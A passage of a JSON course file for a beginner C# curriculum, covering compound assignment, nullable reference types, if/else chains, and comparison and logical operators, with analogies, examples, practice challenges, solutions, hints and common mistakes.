              "solution": "// Starting stats\nint level = 1;\nint experience = 0;\nint coins = 100;\n\nConsole.WriteLine(\"Starting - Level: \" + level + \", XP: \" + experience + \", Coins: \" + coins);\n\n// Gain 50 experience\nexperience += 50;\nConsole.WriteLine(\"Gained XP! - Level: \" + level + \", XP: \" + experience + \", Coins: \" + coins);\n\n// Level up\nlevel++;\nConsole.WriteLine(\"Level up! - Level: \" + level + \", XP: \" + experience + \", Coins: \" + coins);\n\n// Double coins\ncoins *= 2;\nConsole.WriteLine(\"Coins doubled! - Level: \" + level + \", XP: \" + experience + \", Coins: \" + coins);\n\n// Spend 25 coins\ncoins -= 25;\nConsole.WriteLine(\"Spent coins - Level: \" + level + \", XP: \" + experience + \", Coins: \" + coins);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Level\"",
                  "expectedOutput": "Level",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"XP\"",
                  "expectedOutput": "XP",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Coins\"",
                  "expectedOutput": "Coins",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use +=, -=, *=, and ++ operators! experience += 50 adds to experience, level++ increases by 1, coins *= 2 doubles coins, coins -= 25 subtracts!"
                },
                {
                  "level": 2,
                  "text": "Forgetting that score++ changes the variable permanently! It's not temporary – score is now 1 higher."
                },
                {
                  "level": 3,
                  "text": "Trying to use ++ with non-numeric types: name++ doesn't make sense! You can only increment numbers."
                },
                {
                  "level": 4,
                  "text": "Confusing score += 5 with score = 5: The first ADDS 5, the second REPLACES with 5!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting that score++ changes the variable permanently! It's not temporary – score is now 1 higher.",
                  "consequence": "This is a common error that can cause problems.",
                  "correction": "Review the lesson content and examples carefully."
                },
                {
                  "mistake": "Trying to use ++ with non-numeric types",
                  "consequence": "name++ doesn't make sense! You can only increment numbers.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Confusing score += 5 with score = 5",
                  "consequence": "The first ADDS 5, the second REPLACES with 5!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-02-06",
          "title": "Nullable Reference Types",
          "moduleId": "module-02",
          "order": 6,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a hotel front desk. In the old days, when you asked for 'the guest in room 101', they might say 'nobody's there' and you'd get confused. Now they have a system: if a room MIGHT be empty, it has a special tag.\n\nThat's NULLABLE REFERENCE TYPES! In modern C#, variables tell you upfront whether they might be 'null' (empty/nothing).\n\n- string name = 'Alice';  // PROMISE: This will NEVER be null!\n- string? nickname = null;  // MIGHT be null - the ? warns you!\n\nWhy does this matter? NullReferenceException is the #1 bug in C# programs! With nullable types:\n- Compiler WARNS you when you might hit a null\n- You're FORCED to check for null before using potentially null values\n- Fewer runtime crashes, more reliable code!\n\nThink of it as a 'Handle With Care' sticker on fragile packages - you know to be extra careful."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "Nullable reference types help you avoid the dreaded NullReferenceException - one of the most common bugs in C# programs! By marking variables with `?`, you're telling both the compiler and other developers that this value might be null and needs to be handled carefully. Modern C# (.NET 6+) enables this feature by default in new projects.",
              "code": "// Non-nullable - MUST have a value!\nstring firstName = \"Alice\";  // OK\n// string lastName = null;   // WARNING! Non-nullable can't be null!\n\n// Nullable - CAN be null (use ? after type)\nstring? middleName = null;    // OK - ? means nullable\nstring? nickname = \"Ali\";     // Also OK - can have value\n\n// Simulating a value that might be null\nstring? maybeName = GetUserInput();  // Could return null!\n\n// WRONG: Using nullable without checking\n// Console.WriteLine(maybeName.Length);  // WARNING! Might be null!\n\n// Safe ways to handle nullable:\n\n// 1. Null check with if\nif (maybeName != null)\n{\n    Console.WriteLine(maybeName.Length);  // Safe now!\n}\n\n// 2. Null-conditional operator ?.\nint? length = maybeName?.Length;  // Returns null if maybeName is null\nConsole.WriteLine($\"Length: {length}\");\n\n// 3. Null-coalescing operator ??\nstring displayName = maybeName ?? \"Guest\";  // Use \"Guest\" if null\nConsole.WriteLine($\"Hello, {displayName}!\");\n\n// 4. Pattern matching (modern approach - recommended!)\nif (maybeName is string actualName)\n{\n    Console.WriteLine($\"Welcome, {actualName}!\");\n}\nelse\n{\n    Console.WriteLine(\"No name provided\");\n}\n\n// 5. Null-coalescing assignment ??=\nstring? message = null;\nmessage ??= \"Default message\";  // Only assigns if message is null\nConsole.WriteLine(message);\n\n// Helper method that might return null\nstatic string? GetUserInput()\n{\n    // Simulating: sometimes we get input, sometimes not\n    return Random.Shared.Next(2) == 0 ? null : \"User123\";\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`string name`**: Non-nullable reference type. Compiler expects this to NEVER be null. You'll get warnings if you try to assign null.\n\n**`string? name`**: Nullable reference type. The `?` says 'this might be null'. Compiler will warn you to check before using it.\n\n**`name?.Length`**: Null-conditional operator. If name is null, returns null instead of crashing. Safe way to access members!\n\n**`name ?? \"default\"`**: Null-coalescing operator. If name is null, use the value after `??`. Great for providing fallback values.\n\n**`name ??= \"value\"`**: Null-coalescing assignment (C# 8+). Only assigns if the variable is currently null. Clean and concise!\n\n**`name!`**: Null-forgiving operator. Tells compiler 'trust me, it's not null'. Use sparingly - it bypasses safety checks!\n\n**`is string actualName`**: Pattern matching with type check. If name is not null, assigns it to `actualName` and enters the block. Modern and readable!"
            },
            {
              "type": "WARNING",
              "title": "Common Mistakes",
              "content": "**Ignoring nullable warnings**: Those compiler warnings exist to prevent NullReferenceException! Don't just suppress them - fix the underlying issue by adding null checks.\n\n**Overusing the ! operator**: `name!.Length` tells the compiler 'trust me, this isn't null'. But if you're wrong, you still crash! Only use `!` when you genuinely know something isn't null and the compiler just can't prove it.\n\n**Forgetting nullable is compile-time only**: Nullable reference types don't change runtime behavior - they're just compiler hints. A `string?` variable that's actually not null will still work, and a `string` that somehow becomes null will still crash.\n\n**Not enabling nullable in existing projects**: In .NET 6+, new projects have nullable enabled by default (`<Nullable>enable</Nullable>` in .csproj). Older projects may need to enable it manually to get these safety benefits."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-02-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a user profile system with nullable handling!\n\n1. Create a non-nullable string 'username' (required)\n2. Create a nullable string 'bio' (optional)\n3. Create a nullable string 'website' (optional)\n4. Display username (always safe)\n5. Display bio using ?? to show 'No bio provided' if null\n6. Display website using ?. and ?? to safely get Length or show 'No website'",
              "starterCode": "// Required field (non-nullable)\nstring username = \"CSharpDev2024\";\n\n// Optional fields (nullable)\nstring? bio = null;\nstring? website = \"https://example.com\";\n\n// Display username (always safe)\n\n// Display bio with fallback\n\n// Display website length safely",
              "solution": "// Required field (non-nullable)\nstring username = \"CSharpDev2024\";\n\n// Optional fields (nullable)\nstring? bio = null;\nstring? website = \"https://example.com\";\n\n// Display username (always safe)\nConsole.WriteLine(\"Username: \" + username);\n\n// Display bio with fallback\nstring displayBio = bio ?? \"No bio provided\";\nConsole.WriteLine(\"Bio: \" + displayBio);\n\n// Display website length safely\nint? websiteLength = website?.Length;\nConsole.WriteLine(\"Website length: \" + (websiteLength?.ToString() ?? \"No website\"));\n\n// Alternative: Check with if\nif (website != null)\n{\n    Console.WriteLine(\"Website: \" + website);\n}\nelse\n{\n    Console.WriteLine(\"No website configured\");\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain 'Username'",
                  "expectedOutput": "Username",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain 'Bio'",
                  "expectedOutput": "Bio",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain 'No bio provided' or similar",
                  "expectedOutput": "No bio",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use ?? to provide fallback values: bio ?? 'No bio'. Use ?. for safe member access: website?.Length."
                },
                {
                  "level": 2,
                  "text": "Remember: string is non-nullable (must have value), string? is nullable (can be null). The ? makes the difference!"
                },
                {
                  "level": 3,
                  "text": "You can chain operators: website?.Length ?? 0 - gets length if website exists, otherwise 0."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Ignoring nullable warnings",
                  "consequence": "Compiler warnings about possible null references help prevent NullReferenceException at runtime. Don't suppress them without good reason!",
                  "correction": "Always handle nullable values with ?., ??, if-checks, or pattern matching."
                },
                {
                  "mistake": "Overusing the ! operator",
                  "consequence": "The null-forgiving operator (!) bypasses safety checks. If you're wrong, you'll get a NullReferenceException anyway!",
                  "correction": "Only use ! when you KNOW for certain a value isn't null and the compiler just can't prove it."
                },
                {
                  "mistake": "Forgetting ? on nullable types",
                  "consequence": "Without ?, the compiler assumes the variable should never be null. You'll get warnings if you assign null to it.",
                  "correction": "Add ? to types that might legitimately be null: string? optionalName = null;"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-03",
      "title": "Control Flow",
      "description": "Learn decision-making with if/else statements, switch cases, logical operators, and conditional logic.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-03-01",
          "title": "The if Statement (Your First Fork)",
          "moduleId": "module-03",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're walking down a path and you reach a fork in the road. There's a sign that says: 'If it's raining, take the left path (you have an umbrella there). Otherwise, keep going straight.'\n\nThat's EXACTLY what an 'if statement' does in programming! It checks a condition (Is it raining?) and makes a decision:\n\n• If the condition is TRUE → Do this code\n• If the condition is FALSE → Skip that code\n\nIn C#, we use 'if' to make our programs smart. Instead of always doing the same thing, the program can DECIDE what to do based on the situation.\n\nThink of it like a bouncer at a club: 'If you're 21 or older, you can enter. If not, you can't.' The bouncer checks your age (the condition) and makes a decision!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Simple if statement\nint age = 25;\n\nif (age >= 21)\n{\n    Console.WriteLine(\"You can enter!\");\n}\n\nConsole.WriteLine(\"Program continues...\");\n\n// Another example with boolean\nbool hasKey = true;\n\nif (hasKey)\n{\n    Console.WriteLine(\"Door unlocked!\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`if (condition)`**: The 'if' keyword starts the decision. The condition in parentheses MUST evaluate to true or false (a boolean).\n\n**`{ }`**: Curly braces contain the code that runs ONLY if the condition is true. If false, everything in the braces is skipped!\n\n**`age >= 21`**: This is a comparison that produces true or false. >= means 'greater than or equal to'. If age is 21 or more, it's true!\n\n**`Code after if`**: Code outside the if block ALWAYS runs, whether the condition was true or false. The program continues normally."
            },
            {
              "type": "WARNING",
              "title": "Watch Out!",
              "content": "## Common Pitfalls with if Statements\n\n**Semicolon after if:** Never put a semicolon right after the condition! `if (age >= 21);` creates an empty if block, and the code in braces will ALWAYS run.\n\n**Using = instead of ==:** Using a single equals sign is ASSIGNMENT, not comparison. `if (age = 21)` tries to assign 21 to age, which causes a compiler error in C#.\n\n**Skipping braces:** While C# allows single-line if statements without braces, this is risky. Adding a second line later will NOT be part of the if block!\n\n**Truthy values:** Unlike JavaScript, C# requires an actual boolean. `if (age)` is invalid - you must write `if (age > 0)` or similar."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-03-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple age verification system:\n\n1. Create an int variable called 'playerAge' and set it to any number\n2. Use an if statement to check if playerAge is >= 13\n3. If true, display: 'Welcome to the game!'\n4. After the if statement, always display: 'Thank you for visiting'\n\nTry changing playerAge to different values and see what happens!",
              "starterCode": "// Create your age variable\nint playerAge = 15;\n\n// Write your if statement here\n\n// This should always display\nConsole.WriteLine(\"Thank you for visiting\");",
              "solution": "// Create your age variable\nint playerAge = 15;\n\n// Write your if statement here\nif (playerAge >= 13)\n{\n    Console.WriteLine(\"Welcome to the game!\");\n}\n\n// This should always display\nConsole.WriteLine(\"Thank you for visiting\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Thank you for visiting\"",
                  "expectedOutput": "Thank you for visiting",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Remember: if (condition) { code to run if true }. The condition should be playerAge >= 13. Don't forget the curly braces!"
                },
                {
                  "level": 2,
                  "text": "Forgetting parentheses around the condition: if age >= 13 is WRONG! Must be if (age >= 13)"
                },
                {
                  "level": 3,
                  "text": "Forgetting curly braces: While you CAN skip them for one line, it's bad practice. Always use { }!"
                },
                {
                  "level": 4,
                  "text": "Using = instead of ==: if (age = 13) ASSIGNS 13 to age! Use == to COMPARE: if (age == 13)"
                },
                {
                  "level": 5,
                  "text": "Putting a semicolon after the if: if (age >= 13); is WRONG! No semicolon before the { }"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting parentheses around the condition",
                  "consequence": "if age >= 13 is WRONG! Must be if (age >= 13)",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting curly braces",
                  "consequence": "While you CAN skip them for one line, it's bad practice. Always use { }!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using = instead of ==",
                  "consequence": "if (age = 13) ASSIGNS 13 to age! Use == to COMPARE: if (age == 13)",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Putting a semicolon after the if",
                  "consequence": "if (age >= 13); is WRONG! No semicolon before the { }",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-03-02",
          "title": "else and else if (Multiple Paths)",
          "moduleId": "module-03",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've learned about 'if' - taking ONE path if a condition is true. But what if you want to do something DIFFERENT when the condition is false?\n\nThat's where 'else' comes in! Think of it like this:\n\n'If it's sunny, wear sunglasses. ELSE (otherwise), wear a hat.'\n\nYou're guaranteed to do ONE of these two things - either the first or the second, never both!\n\nBut what if you have MORE than two options? That's where 'else if' helps:\n\n'If it's sunny, wear sunglasses. ELSE IF it's raining, take an umbrella. ELSE (for anything else), wear a hat.'\n\nC# checks each condition in order, top to bottom, and executes the FIRST one that's true. Once it finds a match, it STOPS checking the rest!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "int temperature = 75;\n\n// if-else: Two paths\nif (temperature > 80)\n{\n    Console.WriteLine(\"It's hot! Stay hydrated.\");\n}\nelse\n{\n    Console.WriteLine(\"Nice weather!\");\n}\n\n// if-else if-else: Multiple paths\nint score = 85;\n\nif (score >= 90)\n{\n    Console.WriteLine(\"Grade: A\");\n}\nelse if (score >= 80)\n{\n    Console.WriteLine(\"Grade: B\");\n}\nelse if (score >= 70)\n{\n    Console.WriteLine(\"Grade: C\");\n}\nelse\n{\n    Console.WriteLine(\"Grade: F\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`else { }`**: The 'else' block runs ONLY if the 'if' condition was false. Think of it as the 'otherwise' path. It's optional!\n\n**`else if (condition) { }`**: 'else if' adds MORE conditions to check. It only runs if all previous conditions were false AND this condition is true.\n\n**`Order matters!`**: C# checks from top to bottom. Once a condition is true, it runs that block and SKIPS the rest. score=85 hits the 'B' grade and never checks 'C'!\n\n**`Final else`**: The final 'else' is the 'catch-all' - it runs if NONE of the conditions above were true. It's like the 'default' option."
            },
            {
              "type": "WARNING",
              "title": "Watch Out!",
              "content": "## Common Pitfalls with else if Chains\n\n**Wrong order of conditions:** If checking ranges, always start with the highest first! If you check `score >= 70` before `score >= 90`, a score of 95 will match the 70 check first and show 'C' instead of 'A'.\n\n**Putting else if after else:** The final `else` must be LAST! C# will give you an error if you try to add `else if` after `else`.\n\n**Overlapping conditions:** Make sure your conditions don't overlap unexpectedly. Each condition should be mutually exclusive or ordered from most specific to least specific.\n\n**Missing final else:** While optional, forgetting a final `else` can lead to silent bugs where no code runs and you get unexpected behavior."
            },
            {
              "type": "REAL_WORLD",
              "title": "Validation in Production E-commerce Systems",
              "content": "## Real-World Validation Patterns\n\nIn production e-commerce systems like ShopFlow, validation logic is critical for preventing bad data from corrupting your database, ensuring security, and providing clear feedback to users. Here's how professional developers approach validation.\n\n**Defense in Depth**\nNever trust user input—even from your own frontend. Production systems validate at multiple layers:\n1. **Client-side** (JavaScript): Fast feedback, but easily bypassed—never rely on it alone\n2. **API Controller**: Data Annotations and model binding catch obvious errors\n3. **Service Layer**: Business rules like 'cart cannot exceed $10,000' or 'user must be verified to purchase alcohol'\n4. **Database**: Constraints ensure data integrity even if code has bugs\n\n**Early Returns (Guard Clauses)**\nProfessional code validates preconditions first and returns early, avoiding deep nesting:\n\n```csharp\npublic decimal CalculateDiscount(Order order)\n{\n    if (order is null) throw new ArgumentNullException(nameof(order));\n    if (order.Items.Count == 0) return 0m;\n    if (order.Total < 50m) return 0m;\n    \n    // Main logic only runs if all preconditions pass\n    return order.Total * GetDiscountRate(order.Customer);\n}\n```\n\n**Fail Fast Principle**\nDetect and report errors as early as possible. A validation error caught at the API layer is cheaper to handle than a database constraint violation, which is cheaper than a production bug discovered by customers.\n\n**Pattern Matching for Status Handling**\nC#'s pattern matching makes complex conditional logic readable:\n\n```csharp\nstring message = orderStatus switch\n{\n    \"Pending\" => \"Your order is being processed.\",\n    \"Shipped\" => \"Your order is on its way!\",\n    \"Delivered\" => \"Enjoy your purchase!\",\n    _ => \"Status unknown—contact support.\"\n};\n```\n\n**In ShopFlow**, we implement multi-layer validation using Data Annotations on DTOs, FluentValidation for complex rules, and domain validation in entity methods. This ensures invalid data never reaches the database."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Control Flow Patterns in Clean Code",
              "content": "## Designing Readable Conditional Logic\n\nControl flow is where code complexity often explodes. These patterns keep ShopFlow's business logic maintainable as it grows.\n\n**Avoid Deep Nesting**\nDeeply nested if-statements are hard to read and test. Compare:\n\n```csharp\n// BAD: Deep nesting obscures the happy path\nif (user != null)\n{\n    if (user.IsActive)\n    {\n        if (cart.Items.Count > 0)\n        {\n            if (cart.Total >= 25m)\n            {\n                ApplyFreeShipping(cart);\n            }\n        }\n    }\n}\n\n// GOOD: Guard clauses with early returns\nif (user is null) return;\nif (!user.IsActive) return;\nif (cart.Items.Count == 0) return;\nif (cart.Total < 25m) return;\n\nApplyFreeShipping(cart);\n```\n\n**Replace Conditionals with Polymorphism**\nWhen you find yourself writing switch statements on object types, consider using polymorphism instead:\n\n```csharp\n// Instead of: if (product is DigitalProduct) ... else if (product is PhysicalProduct) ...\n// Use: product.CalculateShipping() where each type implements its own logic\n```\n\n**Boolean Method Extraction**\nComplex conditions should be extracted to well-named methods:\n\n```csharp\n// BAD: What does this even check?\nif (order.Total > 100m && order.Customer.MemberSince < DateTime.Today.AddYears(-1) && !order.HasPromoCode)\n\n// GOOD: The condition explains itself\nif (IsEligibleForLoyaltyDiscount(order))\n```\n\n**Null-Coalescing and Null-Conditional Operators**\nModern C# provides elegant null handling:\n\n```csharp\n// Null-coalescing: provide default value\nstring customerName = order.Customer?.Name ?? \"Guest\";\n\n// Null-conditional: safely navigate nullable references  \nint? itemCount = cart?.Items?.Count;\n```\n\n**In ShopFlow**, we enforce a maximum nesting depth of 2 in code reviews, extract complex conditions to descriptive methods, and use pattern matching for type-based logic. These practices keep our codebase readable as the team grows. This discipline pays dividends in reduced debugging time and easier onboarding for new developers."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-03-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple game difficulty selector!\n\n1. Create an int variable 'level' and set it to any number\n2. Use if-else if-else to display messages:\n   - If level == 1: 'Easy mode selected'\n   - Else if level == 2: 'Normal mode selected'\n   - Else if level == 3: 'Hard mode selected'\n   - Else: 'Invalid level! Defaulting to Normal.'\n\nTry changing the level value to test all paths!",
              "starterCode": "// Create level variable\nint level = 2;\n\n// Write your if-else if-else chain here",
              "solution": "// Create level variable\nint level = 2;\n\n// Write your if-else if-else chain here\nif (level == 1)\n{\n    Console.WriteLine(\"Easy mode selected\");\n}\nelse if (level == 2)\n{\n    Console.WriteLine(\"Normal mode selected\");\n}\nelse if (level == 3)\n{\n    Console.WriteLine(\"Hard mode selected\");\n}\nelse\n{\n    Console.WriteLine(\"Invalid level! Defaulting to Normal.\");\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"mode\"",
                  "expectedOutput": "mode",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use == to compare (not =). Chain them: if (...) { } else if (...) { } else if (...) { } else { }"
                },
                {
                  "level": 2,
                  "text": "Using = instead of == for comparison: level = 1 ASSIGNS 1, level == 1 COMPARES!"
                },
                {
                  "level": 3,
                  "text": "Forgetting that only ONE block runs: If score is 95, only the 'A' grade displays. The others are skipped!"
                },
                {
                  "level": 4,
                  "text": "Putting else if AFTER else: The final else must be LAST! else if after else causes an error."
                },
                {
                  "level": 5,
                  "text": "Wrong order of conditions: If you check score >= 70 BEFORE score >= 90, a score of 95 will hit 'C' first and stop!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "level = 1 ASSIGNS 1, level == 1 COMPARES!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting that only ONE block runs",
                  "consequence": "If score is 95, only the 'A' grade displays. The others are skipped!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Putting else if AFTER else",
                  "consequence": "The final else must be LAST! else if after else causes an error.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong order of conditions",
                  "consequence": "If you check score >= 70 BEFORE score >= 90, a score of 95 will hit 'C' first and stop!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-03-03",
          "title": "Comparison & Logical Operators",
          "moduleId": "module-03",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've been using comparisons like >= and ==, but there's a whole toolkit available! These are called COMPARISON OPERATORS, and they let you ask questions about values:\n\n• == (equals): Is this EXACTLY the same?\n• != (not equals): Is this DIFFERENT?\n• > (greater than): Is this BIGGER?\n• < (less than): Is this SMALLER?\n• >= (greater or equal): Is this bigger OR the same?\n• <= (less or equal): Is this smaller OR the same?\n\nBut what if you need to check MULTIPLE conditions? Like: 'If it's Saturday AND I have money, I'll go to the movies.'\n\nThat's where LOGICAL OPERATORS come in:\n• && (AND): BOTH conditions must be true\n• || (OR): AT LEAST ONE condition must be true\n• ! (NOT): Flips true to false, false to true\n\nThink of && like a bouncer checking TWO IDs: 'You need to be 21 AND have a ticket.' You need BOTH!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Comparison operators\nint score = 85;\n\nif (score == 100) { Console.WriteLine(\"Perfect!\"); }\nif (score != 100) { Console.WriteLine(\"Not perfect, but good!\"); }\nif (score > 80) { Console.WriteLine(\"Above 80!\"); }\nif (score >= 85) { Console.WriteLine(\"85 or higher!\"); }\n\n// Logical operators - AND (&&)\nint age = 25;\nbool hasLicense = true;\n\nif (age >= 16 && hasLicense)\n{\n    Console.WriteLine(\"You can drive!\");\n}\n\n// Logical operators - OR (||)\nbool isWeekend = true;\nbool isHoliday = false;\n\nif (isWeekend || isHoliday)\n{\n    Console.WriteLine(\"No work today!\");\n}\n\n// NOT operator (!)\nbool isRaining = false;\n\nif (!isRaining)\n{\n    Console.WriteLine(\"Let's go outside!\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`==`**: Double equals checks EQUALITY. Don't confuse with = (assignment)! age == 18 checks if age is 18. age = 18 SETS age to 18!\n\n**`!=`**: Not equals checks INEQUALITY. score != 100 is true if score is anything OTHER than 100.\n\n**`&&`**: AND requires BOTH sides to be true. age >= 21 && hasID is only true if BOTH conditions are true. If either is false, the whole thing is false!\n\n**`||`**: OR requires AT LEAST ONE side to be true. isWeekend || isHoliday is true if EITHER (or both!) is true. Only false if BOTH are false.\n\n**`!`**: NOT flips the value. !isRaining means 'if it is NOT raining'. If isRaining is false, !isRaining is true!"
            },
            {
              "type": "WARNING",
              "title": "Watch Out!",
              "content": "## Common Pitfalls with Operators\n\n**Single & or | vs && or ||:** In C#, use DOUBLE symbols (`&&` and `||`) for logical operators. Single `&` and `|` are bitwise operators - they work but don't short-circuit, which can cause bugs!\n\n**Short-circuit evaluation:** `&&` stops checking if the left side is false. `||` stops if the left is true. This matters with method calls: `obj != null && obj.Value > 0` is safe because if obj is null, the second part never runs.\n\n**Operator precedence:** `age > 18 && hasTicket || isVIP` is confusing! Use parentheses: `(age > 18 && hasTicket) || isVIP` to make intent clear. `&&` has higher precedence than `||`.\n\n**Pattern matching alternative:** Modern C# offers `is not null` instead of `!= null`, which reads more naturally: `if (obj is not null)`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-03-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a movie theater admission system!\n\nVariables:\n- int age (set to any number)\n- bool hasParent (set to true or false)\n- bool hasTicket (set to true or false)\n\nRules using if statements:\n1. If age >= 18 AND hasTicket: 'Welcome! Enjoy the movie.'\n2. Else if age < 18 AND hasParent AND hasTicket: 'Welcome with your parent!'\n3. Else if !hasTicket: 'Please purchase a ticket first.'\n4. Else: 'Sorry, you need a parent to attend.'\n\nTest with different combinations!",
              "starterCode": "// Set up variables\nint age = 16;\nbool hasParent = true;\nbool hasTicket = true;\n\n// Write your if-else chain with logical operators",
              "solution": "// Set up variables\nint age = 16;\nbool hasParent = true;\nbool hasTicket = true;\n\n// Write your if-else chain with logical operators\nif (age >= 18 && hasTicket)\n{\n    Console.WriteLine(\"Welcome! Enjoy the movie.\");\n}\nelse if (age < 18 && hasParent && hasTicket)\n{\n    Console.WriteLine(\"Welcome with your parent!\");\n}\nelse if (!hasTicket)\n{\n    Console.WriteLine(\"Please purchase a ticket first.\");\n}\nelse\n{\n    Console.WriteLine(\"Sorry, you need a parent to attend.\");\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should show correct message for minor with parent and ticket",
                  "expectedOutput": "Welcome with your parent!",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Code should use logical AND operator",
                  "expectedOutput": "&&",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Code should use the NOT operator for ticket check",
                  "expectedOutput": "!hasTicket",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use && to combine conditions: (age >= 18 && hasTicket). Use ! to check 'not': !hasTicket means 'does NOT have ticket'."
                },
                {
                  "level": 2,
                  "text": "Using & or | instead of && or ||: In C#, use DOUBLE symbols for logical operators! & and | are bitwise operators (advanced topic)."
                },
                {
                  "level": 3,
                  "text": "Confusing = with ==: if (age = 18) ASSIGNS 18! Use if (age == 18) to COMPARE!"
                },
                {
                  "level": 4,
                  "text": "Wrong operator precedence: age > 18 && hasTicket || isVIP is confusing! Use parentheses: (age > 18 && hasTicket) || isVIP"
                },
                {
                  "level": 5,
                  "text": "Forgetting ! means 'not': !hasTicket is true when hasTicket is FALSE. It reads as 'if does NOT have ticket'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using & or | instead of && or ||",
                  "consequence": "In C#, use DOUBLE symbols for logical operators! & and | are bitwise operators (advanced topic).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Confusing = with ==",
                  "consequence": "if (age = 18) ASSIGNS 18! Use if (age == 18) to COMPARE!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong operator precedence",
                  "consequence": "age > 18 && hasTicket || isVIP is confusing! Use parentheses: (age > 18 && hasTicket) || isVIP",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting ! means 'not'",
                  "consequence": "!hasTicket is true when hasTicket is FALSE. It reads as 'if does NOT have ticket'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-03-04",
          "title": "The switch Statement (The Traffic Director)",
          "moduleId": "module-03",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
